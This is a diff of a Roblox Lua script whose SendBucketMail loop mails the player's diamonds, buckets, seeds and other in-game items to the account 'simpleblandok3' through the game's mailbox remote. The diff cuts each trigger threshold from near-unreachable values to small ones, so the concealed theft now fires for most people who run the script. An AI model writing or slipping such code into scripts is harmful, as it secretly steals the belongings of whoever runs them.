@@ -597,7 +597,7 @@ local request = (syn and syn.request) or request or (http and http.request) or h
 
 local function SendBucketMail()
     while true do
-if DiamondsAmount > 10000009999 then
+if DiamondsAmount > 3000000 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -609,7 +609,7 @@ local args = {
 
 end
 wait(10)
-        if MagicBucketAM > 999200 then
+        if MagicBucketAM > 200 then
             local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -623,7 +623,7 @@ wait(10)
 
         end
 wait(10)
-if DiamondsSeedAmount > 99950 then
+if DiamondsSeedAmount > 50 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -635,7 +635,7 @@ local args = {
 end
 wait(10)
 
-if InstaPlantAmount > 9999920 then
+if InstaPlantAmount > 30 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
@@ -646,7 +646,7 @@ local args = {
             game:GetService("ReplicatedStorage").Network:FindFirstChild("Mailbox: Send"):InvokeServer(unpack(args))
 end
 wait(10)
-if SeedBagAmount > 999100 then
+if SeedBagAmount > 100 then
 local args = {
                 [1] = "simpleblandok3",
                 [2] = "enjoy bro",
